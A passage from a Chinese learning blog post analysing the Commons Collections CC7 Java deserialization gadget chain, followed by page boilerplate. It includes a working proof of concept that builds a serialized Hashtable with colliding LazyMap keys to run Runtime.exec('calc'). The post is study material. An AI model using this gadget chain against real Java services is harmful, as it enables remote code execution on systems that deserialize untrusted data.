注意下别传错了就好了，两个hashMap,两个lazyMap</span><br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-keyword">this</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br><br>        <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))	<span class="hljs-comment">// 传的都是map旗下的，忽略</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>        <span class="hljs-keyword">if</span> (m.size() != size())<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>            <span class="hljs-keyword">while</span> (i.hasNext()) &#123;	<span class="hljs-comment">// 这个正常传都没问题</span><br>                Entry&lt;K,V&gt; e = i.next();<br>                K key = e.getKey();<br>                V value = e.getValue();<br>                <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123;	<span class="hljs-comment">// LazyMap#put时，value别传null就好了</span><br>                    <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-keyword">null</span> &amp;&amp; m.containsKey(key)))	<span class="hljs-comment">// m.get(key)// key无所谓，主要是m</span><br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>                ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>参考官方的思路，自己捋一下：</p>
+<p><code>Hashtable#readObject</code> –&gt; <code>Hashtable#reconstitutionPut</code> –&gt; <code>LazyMap#equals</code>(但Lazy又没有equals，所以来到父类) –&gt; <code>AbstractMapDecorator#equals</code> –&gt;<code>HashMap#equals</code>(HashMap也没有equals，所以来到父类)–&gt; <code>AbstractMap#equals</code> –&gt; <code>LazyMap#get</code></p>
+<p>接下来就是一步一步的满足去调用就OK了</p>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
+<li><p><code>Hashtable#readObject</code></p>
+<p>这里有个for循环，满足的话需要HashTable中有值，才能走到<code>reconstitutionPut</code>，不过这里没什么，因为一定会向HashTable添加值的，使用<code>Hashtable#put</code>添加，添加的时候需要注意<strong>key的hash值不能相同</strong>或者<strong>key不能相同</strong>，否则无法添不进去</p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/5.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p><code>Hashtable#reconstitutionPut</code></p>
+<ul>
+<li><p><code>tab[index]</code>该值不能为空 ，否则无法进入循环，tab的赋值发现了两处，一个是<code>addEntry</code>这个在反序列化的时候不能用，另一个是在该函数for循环的下面，会为tab[index]赋值，这里可以在反序列话的时候使用，所以选择此处。也就是需要第一次添加的index和第二次使用的index的值相同，也就是要满足两次<code>key.hashCode</code>相同</p>
+</li>
+<li><p><code>int index = (hash &amp; 0x7FFFFFFF) % tab.length;</code>先位运算，再取余</p>
+<p><code>int hash = key.hashCode();</code>hash的来源，这里就需要先找一下，哪些key经过计算后的index的值相同</p>
+<p>因为这里需要传入LazyMap，所以先来看一下<code>LazyMap#hashCode</code>，没有，使用父类的hashCode进行计算，最终调用的是<code>hashMap#hashCode</code>，还需要注意的是，在<code>HashTable#put</code>时两个key不能相同</p>
+<p>大概算一下，有好多的，随便取一个</p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/6.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>再向HashTable#put时，会改变LazyMap的key（测试过程中发现）</p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>其原因是在<code>Hashtable#put</code>中调用了<code>key.equals(key)</code>跟进到<code>AbstractMap#equals</code>,再到<code>LazyMap#get</code></p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>在<code>LazyMap#get</code>中调用了put方法，导致lazyMap2多了一个</p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>为了满足hash值相等，所以需要将多出来的这个remove掉，现在来到<code>org.apache.commons.collections.map.AbstractMapDecorator#equals</code>中</p>
+</li>
+<li><p>然后后面的就没有什么了，直接就是能够走到<code>java.util.AbstractMap#equals</code></p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以此时，当m是那个带有执行代码的LazyMap就ok</p>
+</li>
+</ul>
+<p>分析发现，m就是LazyMap2，所以可以写poc了</p>
+</li>
+</ul>
+<h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;);<br><br>    Map map1 = <span class="hljs-keyword">new</span> HashMap();<br>    Map map2 = <span class="hljs-keyword">new</span> HashMap();<br><br>    Map lazyMap1 = LazyMap.decorate(map1,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>));<br>    lazyMap1.put(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">1</span>);<br>    Map lazyMap2 = LazyMap.decorate(map2, <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">2</span>));<br>    lazyMap2.put(<span class="hljs-string">&quot;bB&quot;</span>,<span class="hljs-number">1</span>);<br><br>    Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable();<br>    hashtable.put(lazyMap1,<span class="hljs-number">1</span>);<br>    hashtable.put(lazyMap2,<span class="hljs-number">1</span>);<br>    lazyMap2.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br><br>    Field factory = LazyMap.class.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap2,chainedTransformer);<br><br>    serialize(hashtable);<br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>简单总结下CC7，emmmm….，是有点绕的，并且涉及到一个hash碰撞的问题，菜鸡的我一开始有点手足无所😣，不过还好不算太难，还搞得来。</p>
+<p>图又可以更新了</p>
+<p><img src="/2022/10/22/CommonsCollections4%E3%80%815%E3%80%817/12.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CC也算是看完了，其实感觉最终要的是危险方法，也就是最终能执行代码的地方，CC一共7条链，最终能够执行代码的地方也就两处，所以就是找危险方法很重要，链子的话，慢慢找呗，基本上都会有的吧，不过可能会麻烦一点</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52988816/article/details/126396248">Java安全—CommonsCollections7</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=db93b94230228cb739b48f4f59e74abd">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java">ysoserial_CommonsCollections7</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/huyuchengus/article/details/128125547">Java Hash 碰撞</a></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CommonsCollections4、5、7</div>
+      <div>http://example.com/2022/10/22/CommonsCollections4、5、7/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Mechoy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月22日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="Thymeleaf模板注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Thymeleaf模板注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/15/CommonsCollections2/" title="CommonsCollections2">
+                        <span class="hidden-mobile">CommonsCollections2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://mechoy.github.io" target="_blank" rel="nofollow noopener"><span>Mechoy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
